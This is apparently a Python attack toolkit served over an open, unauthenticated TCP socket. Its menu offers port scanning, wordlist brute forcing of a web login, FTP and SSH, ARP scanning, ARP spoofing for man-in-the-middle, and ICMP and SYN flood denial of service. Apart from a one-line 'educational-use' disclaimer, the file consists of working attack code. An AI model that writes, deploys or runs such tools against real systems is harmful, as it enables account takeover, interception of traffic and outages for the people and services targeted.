#!/usr/bin/env python3
# Educational-use only. Run in a controlled lab environment.

import socket
import ftplib
import paramiko
import requests
from bs4 import BeautifulSoup
from scapy.all import *
from scapy.layers.l2 import ARP
from datetime import datetime
import time
import random
import os

# ===== Constants =====
ROCKYOU_PATH = "/usr/share/wordlists/rockyou.txt"  # Make sure it's extracted
LOG_FILE = "server_client_log.txt"


# ===== Utility Functions =====
def log_action(client_ip, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as log:
        log.write(f"[{timestamp}] [{client_ip}] {message}\n")


def send_client(client_socket, client_ip, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg_with_time = f"[{timestamp}] {message}\n"
    client_socket.send(msg_with_time.encode())
    log_action(client_ip, message)


def recv_client(client_socket):
    try:
        return client_socket.recv(4096).decode().strip()
    except:
        return ""


def timer():
    return random.random() + random.randint(1, 3) * int(random.choice("123"))


def load_passwords():
    if not os.path.exists(ROCKYOU_PATH):
        return []
    with open(ROCKYOU_PATH, "r", encoding="latin-1") as f:
        for line in f:
            yield line.strip()


# ===== Functional Modules =====

def port_list(client_socket, client_ip):
    ports = []
    while True:
        send_client(client_socket, client_ip, "Enter a port to scan (0 to finish): ")
        port_str = recv_client(client_socket)
        if not port_str:
            break
        try:
            port = int(port_str)
            if port == 0:
                send_client(client_socket, client_ip, f"Ports to scan: {', '.join(map(str, ports)) if ports else 'None'}")
                return ports
            elif 1 <= port <= 65535:
                ports.append(port)
                send_client(client_socket, client_ip, f"Port {port} added.")
            else:
                send_client(client_socket, client_ip, "Enter a valid port between 1 and 65535.")
        except ValueError:
            send_client(client_socket, client_ip, "Invalid input. Please enter a number.")


def port_scanner(client_socket, client_ip, ip, ports):
    for port in ports:
        try:
            scan_socket = socket.socket()
            scan_socket.settimeout(4)
            check = scan_socket.connect_ex((ip, port))

            if check == 0:
                try:
                    scan_socket.send(b"hello server\r\n")
                    server_data = scan_socket.recv(1024).decode().strip()
                except socket.timeout:
                    server_data = "No response"
                except:
                    server_data = "No banner"
                send_client(client_socket, client_ip, f"[+] Port {port} is open | Banner: {server_data}")
            else:
                send_client(client_socket, client_ip, f"[-] Port {port} is closed")

            scan_socket.close()
            time.sleep(timer())

        except Exception as e:
            send_client(client_socket, client_ip, f"Error scanning port {port}: {str(e)}")
            continue

def BF_Web_loginpage(client_socket, client_ip):
    for password in load_passwords():
        header = {"User-Agent": "Mozilla/5.0"}
        payload = {"Email": "test@example.com", "Password": password, "RememberMe": "false"}
        session = requests.session()
        res = session.post("https://hack-yourself-first.com/Account/Login", data=payload, headers=header)

        if "Log off" in res.text:
            send_client(client_socket, client_ip, f"Login success with password: {password}")
            return
        else:
            send_client(client_socket, client_ip, f"Failed with password: {password}")


def BF_FTP(client_socket, client_ip):
    for password in load_passwords():
        try:
            connect = ftplib.FTP("10.0.0.12")
            login = connect.login(user="kali", passwd=password)
            if "230" in login:
                send_client(client_socket, client_ip, f"Login successful with password: {password}")
                connect.quit()
                return
        except:
            continue
    send_client(client_socket, client_ip, "FTP brute force finished.")


def ARP_Scan(client_socket, client_ip):
    for address in range(1, 255):
        ip = f"10.0.0.{address}"
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        arp_response = srp1(arp_request, timeout=1, verbose=0)
        if arp_response:
            send_client(client_socket, client_ip, f"IP: {arp_response.psrc}, MAC: {arp_response.hwsrc}")
        else:
            send_client(client_socket, client_ip, f"No ARP reply from {ip}")


def get_mac(ip):
    resp, noresp = sr(ARP(op=1, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff"), retry=2, timeout=1)
    for snd, rcv in resp:
        return rcv[ARP].hwsrc
    return None


def arp_poisoning(client_socket, client_ip, gate_ip, gate_mac, target_ip, target_mac):
    send_client(client_socket, client_ip, f"Starting ARP poisoning {target_ip} <-> {gate_ip}")
    while True:
        send(ARP(op=2, pdst=gate_ip, hwdst=gate_mac, psrc=target_ip), verbose=False)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gate_ip), verbose=False)
        time.sleep(1)


def arp_poi(client_socket, client_ip):
    send_client(client_socket, client_ip, "Enter default Gateway IP: ")
    gate = recv_client(client_socket)
    send_client(client_socket, client_ip, "Enter target IP: ")
    target = recv_client(client_socket)
    gw_mac = get_mac(gate)
    targ_mac = get_mac(target)
    if gw_mac and targ_mac:
        arp_poisoning(client_socket, client_ip, gate, gw_mac, target, targ_mac)
    else:
        send_client(client_socket, client_ip, "MAC address not found. Aborting.")


def BF_SSH(client_socket, client_ip):
    target = '10.0.0.12'
    port = 22
    for password in load_passwords():
        try:
            ssh_session = paramiko.SSHClient()
            ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_session.connect(target, port, "kali", password, timeout=3)
            send_client(client_socket, client_ip, f"SSH login success with password: {password}")
            ssh_session.close()
            return
        except:
            continue
    send_client(client_socket, client_ip, "SSH brute force finished.")


def icmp_flood(client_socket, client_ip, target_ip):
    send_client(client_socket, client_ip, f"Starting ICMP flood on {target_ip}")
    ip = IP(dst=target_ip)
    icmp = ICMP()
    send(ip / icmp / (b"X" * 60000), loop=1, verbose=False)


def syn_flood(client_socket, client_ip, target_ip, target_port):
    send_client(client_socket, client_ip, f"Starting SYN flood on {target_ip}:{target_port}")
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    send(ip / tcp / (b"X" * 60000), loop=1, verbose=False)


# ===== Menu System =====
def welcome(client_socket, client_ip):
    menu = """
Welcome back !
Educational-use only. Run in a controlled lab environment.

Choose your mission:
  1) Scan List of Ports
  2) Brute Force - Web Login Page
  3) Brute Force - FTP
  4) ARP Scan
  5) ARP Spoof
  6) Brute Force - SSH
  7) Packet Sniffer (Coming Soon)
  8) DoS - ICMP Flood
  9) DoS - SYN Flood
Enter choice:
"""
    send_client(client_socket, client_ip, menu)
    choice = recv_client(client_socket)

    if choice == "1":
        send_client(client_socket, client_ip, "Enter target IP: ")
        ip = recv_client(client_socket)
        ports = port_list(client_socket, client_ip)
        port_scanner(client_socket, client_ip, ip, ports)

    elif choice == "2":
        BF_Web_loginpage(client_socket, client_ip)

    elif choice == "3":
        BF_FTP(client_socket, client_ip)

    elif choice == "4":
        ARP_Scan(client_socket, client_ip)

    elif choice == "5":
        arp_poi(client_socket, client_ip)

    elif choice == "6":
        BF_SSH(client_socket, client_ip)

    elif choice == "8":
        send_client(client_socket, client_ip, "Enter target IP: ")
        ip = recv_client(client_socket)
        icmp_flood(client_socket, client_ip, ip)

    elif choice == "9":
        send_client(client_socket, client_ip, "Enter target IP: ")
        ip = recv_client(client_socket)
        send_client(client_socket, client_ip, "Enter target port: ")
        port = int(recv_client(client_socket))
        syn_flood(client_socket, client_ip, ip, port)

    else:
        send_client(client_socket, client_ip, "Invalid choice.")


# ===== Main Server Loop =====
def main():
    server_socket = socket.socket()
    server_socket.bind(("0.0.0.0", 5000))
    server_socket.listen(1)
    print("Server listening on port 5000...")

    while True:
        client_socket, client_addr = server_socket.accept()
        client_ip, _ = client_addr
        print(f"Connection from {client_ip}")
        log_action(client_ip, "Connected")
        try:
            welcome(client_socket, client_ip)
        except Exception as e:
            log_action(client_ip, f"Error: {e}")
        finally:
            client_socket.close()
            log_action(client_ip, "Disconnected")


if __name__ == "__main__":
    main()
